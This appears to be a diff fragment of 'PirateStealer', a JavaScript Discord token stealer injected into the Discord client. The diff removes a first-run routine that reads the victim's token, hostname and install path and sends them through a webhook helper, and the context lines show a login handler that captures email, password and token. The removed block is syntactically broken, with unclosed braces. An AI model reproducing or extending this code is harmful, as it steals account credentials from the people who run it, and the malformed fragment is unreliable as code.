@@ -338,31 +338,6 @@ const hooker = async (content) => {
   req.end();
 };
 
-async function firstTime() {
-    var token = await getToken()
-        if (fs.existsSync(path.join(__dirname, "init"))) {
-            fs.rmdirSync(path.join(__dirname, "init"));
-            if (token == null || token == undefined || token == "") {
-                var cqwe = {
-                    username: "PirateStealer",
-                    content: config.ping[0] ? config.ping[1] : "",
-                    embeds: [{
-                        title: "Discord Initalized (User not Logged in)",
-                        color: config["embed-color"],
-                        fields: [{
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                            inline: !1
-                        }],
-                        author: {
-                            name: "PirateStealer"
-                        },
-                        footer: {
-                            text: "PirateStealer"
-                        
-                    }]
-                };
-                hooker(cqwe);
 const login = async (email, password, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
